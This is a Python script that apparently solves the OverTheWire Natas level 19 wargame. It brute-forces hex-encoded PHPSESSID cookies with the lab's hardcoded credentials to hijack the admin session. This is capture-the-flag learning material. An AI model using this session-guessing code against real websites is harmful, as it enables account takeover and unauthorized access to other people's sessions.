#! /usr/bin/python

import sys
import requests
import binascii
from bs4 import BeautifulSoup

url = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

if len(sys.argv) != 2:
  print('natas19.py [tag]')
  exit()

tag = binascii.b2a_hex(f'-{sys.argv[1]}'.encode('utf8')).decode('utf8')

progress = int(0)

print(f'Applying tag: {tag}')
print('Scanning for admin session:')
print('|====================| 100%')
print('|', end='', flush=True)

for i in range(1, 641):
  sid = '3' + '3'.join(list(str(i))) + tag
  res = requests.post(url, auth=auth, cookies={'PHPSESSID':sid})
  while res.status_code >= 500:
    res = requests.post(url, auth=auth, cookies={'PHPSESSID':sid})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code != 200:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()

  update = int(i/64)
  if update - progress > 0:
    for j in range(update-progress):
      print('==', end='', flush=True)
  progress = update

  content = BeautifulSoup(res.text, 'lxml').find(id='content').contents
  if content[2].split()[2] != 'logged':
    print('\n')
    for line in content:
      print(line)

print('| Done')
print('Scanning complete')

